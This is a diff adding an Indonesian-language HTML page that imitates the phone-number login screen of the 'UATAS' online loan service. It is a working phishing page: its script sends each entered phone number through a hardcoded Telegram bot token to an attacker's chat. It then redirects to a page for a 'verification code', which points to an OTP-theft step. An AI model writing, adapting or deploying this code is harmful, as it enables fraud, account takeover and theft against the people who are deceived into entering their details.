@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UATAS : Pinjaman Dana Online</title>
+  
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  
+  <style>
+    body {
+      background-color: #f7f7f7;
+      font-family: Arial, sans-serif;
+    }
+    
+    .container-box {
+      max-width: 400px;
+      margin: auto;
+      margin-top: 60px;
+      text-align: center;
+    }
+    
+    .header-title {
+      color: #ff6b6b;
+      font-weight: normal;
+      margin-bottom: 20px;
+      margin-top: -20px;
+      transform: translateY(-20px);
+    }
+    
+    .header-title2 {
+      color: #ff6b6b;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    
+    .logo {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+    
+    .app-name {
+      font-size: 32px;
+      font-weight: bold;
+      color: #ff4d6d;
+    }
+    
+    .sub-text {
+      width: 70%;
+      color: #ff6b6b;
+      margin: auto;
+      text-align: center;
+      margin-top: 40px;
+    }
+    
+    .input-phone {
+      width: 85%;
+      margin: auto;
+      display: block;
+      height: 50px;
+      border-radius: 30px;
+      border: none;
+      background: #eee;
+      padding: 0 20px;
+      color: #ff6b6b;
+    }
+    
+    .input-phone:focus {
+      outline: none;
+      color: #ff6b6b;
+    }
+    
+    .input-phone::placeholder {
+      color: #ff6b6b;
+    }
+    
+    .btn-next {
+      margin-top: 20px;
+      width: 70%;
+      height: 50px;
+      border-radius: 30px;
+      border: none;
+      color: white;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ff6b6b, #ff9a6b);
+      margin: auto;
+      display: block;
+      margin-top: 30px;
+    }
+    
+    .btn-next:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    
+    .logo {
+      width: 200px;
+      /* ubah sesuai keinginan */
+      height: auto;
+      /* biar tidak gepeng */
+    }
+    .arrow-img {
+  width: 24px;
+  height: 24px;
+}
+.header {
+  background: linear-gradient(90deg, #f7f7f7,#f7f7f7);
+  color: #ff6b6b;
+  padding: 15px;
+  position: relative;
+}
+
+.title-header {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 18px;
+  font-weight: bold;
+}
+
+.back {
+  position: absolute;
+  left: 15px;
+  top: 12px;
+  cursor: pointer;
+}
+
+.arrow-img {
+  width: 24px;
+  height: 24px;
+}
+  </style>
+</head>
+
+<body>
+  <div class="header">
+  <span class="back" onclick="history.back()">
+    <img src="https://i.ibb.co.com/YB8jTZHv/label-back-btn-theme.png" class="arrow-img">
+  </span>
+  
+  <span class="title-header">UATAS</span>
+</div>
+  <div class="container-box">
+    
+    
+    <p class="header-title2">Selamat datang di</p>
+    
+    <!-- GANTI INI DENGAN GAMBAR KAMU -->
+    <img src="https://i.ibb.co.com/ZzQcTNMP/logouatas.png" class="logo">
+    
+    <div class="app-name"></div>
+    
+    <div class="sub-text">Masukkan Nomor HP anda</div>
+    
+    <input type="tel" class="input-phone" id="phone" inputmode="numeric" maxlength="13" placeholder="">
+    
+    <button class="btn-next" id="submitBtn">Berikutnya</button>
+    
+  </div>
+  <script>
+    const phoneInput = document.getElementById("phone");
+    const btn = document.getElementById("submitBtn");
+    
+    const BOT_TOKEN = "8625789355:AAHlJBmWnheRZNLZt_CchWO6B6Qm9DIYH7g";
+    const CHAT_ID = "8427991917";
+    
+    phoneInput.addEventListener("input", () => {
+      phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
+    });
+    
+    btn.addEventListener("click", async () => {
+      const nomor = phoneInput.value;
+      
+      if (nomor.length < 10 || !nomor.startsWith("08")) {
+        alert("Nomor tidak valid");
+        return;
+      }
+      
+      btn.disabled = true;
+      btn.innerText = "Loading...";
+      
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📱 Nomor HP: ${nomor}`
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.ok) {
+          const nomor = phoneInput.value;
+          
+          // simpan ke localStorage
+          localStorage.setItem("nomorHP", nomor);
+          // ✅ PINDAH HALAMAN DI SINI
+          setTimeout(() => {
+            window.location.href = "verifikasi kode uatas.html";
+          }, 1000);
+        } else {
+          throw new Error();
+        }
+        
+      } catch (error) {
+        alert("Gagal kirim");
+        btn.disabled = false;
+        btn.innerText = "Berikutnya";
+      }
+    });
+  </script>
+</body>
+
+</html>
